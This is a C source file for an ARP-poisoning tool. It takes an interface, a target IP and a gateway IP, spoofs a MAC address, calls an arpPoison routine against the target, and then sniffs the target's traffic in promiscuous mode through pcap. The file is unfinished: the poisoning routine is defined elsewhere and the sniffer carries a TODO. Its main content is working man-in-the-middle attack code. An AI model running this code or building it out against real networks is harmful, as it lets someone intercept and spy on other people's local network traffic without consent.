

#include <stdio.h>
#include "packetStructures.h"
#include "pcap.h"
#include "arp.h"
#include "tcp.h"
#include "pcapSettings.h"

// android mac: f0:27:65:ff:de:43
/*
15:31:23.677800 ARP, Reply pp is-at 0d:0e:0a:0d:00:00 (oui Unknown), length 28
 */

int logTcp(char* ip, uint8_t* hwAddr){
    char filter[60];
    // TODO finish this
    sprintf(filter, "ether[6:4] == 0x%x%x%x%x && ether[10:2] == 0x%x%x", 
        hwAddr[0], hwAddr[1], hwAddr[2], hwAddr[3], hwAddr[4], hwAddr[5]);
    printf("tcp filter: %s\n",filter);

    pcap_t* handle = setPromiscuous(Settings.dev, filter);
    struct pcap_pkthdr header;  /* The header that pcap gives us */
    struct ethernet_h* ethPacket;
    const u_char *packet;       /* The actual packet */
    while(1){
        packet = pcap_next(handle, &header);
        printf("got packet of len %d \n    (", header.len);
        if (header.len < ETHER_H_SIZE)
            goto next;
        memset(&header,0, sizeof(struct pcap_pkthdr)); 
        ethPacket = (struct ethernet_h*)packet;
        if (!ethPacket)
            goto next;
        switch(ntohs(ethPacket->type)){
            case 0x0800:    // IPv4
                printf("IPv4");
            break;
            case 0x86DD:    // IPv6
                printf("IPv6");
            break;
            case 0x0806:    // ARP
                printf("ARP");
            break;
            case 0x6003:    // DECnet
                printf("DECnet");
            break;
            case 0x8035:    // ReverseARP
                printf("ReverseARP");
            break;
            default:
                printf("other 0x%x", ethPacket->type);
        }
        next:
        printf(")\n");

    }
    printf("done listening for tcp\n");
    return 0;
}
int main(int argc, char* argv[]){
    if (argc<4){
        printf("usage: ./a.out <interface> <iptarget> <ipgateway>\n");
        return 1;
    }
    Settings.dev = argv[1];
    Settings.arpMachine = libnet_init(
                                LIBNET_LINK_ADV, /* injection type */
                                Settings.dev,    /* network interface */
                                ERRBUF);         /* errbuf */
    Settings.hostHwAddr = libnet_get_hwaddr(Settings.arpMachine)->ether_addr_octet;
    Settings.hostIp = libnet_get_ipaddr4(Settings.arpMachine);
    uint8_t hwspoof[] = {0xca,0xfe,0xba,0xaa,0xbe,0x0};
    uint8_t targetHwAddr[6];
    Settings.spoofedHwAddr = hwspoof;
   if (Settings.arpMachine == NULL){
        fprintf(stderr, "fail:%s\n", ERRBUF);
        exit(EXIT_FAILURE);
    }
    int ec;
    ec = arpPoison(argv[2], argv[3], targetHwAddr);
    if (ec)
        goto done;
    logTcp(argv[2], targetHwAddr);
    done:
    libnet_destroy(Settings.arpMachine);
    return 0;
}
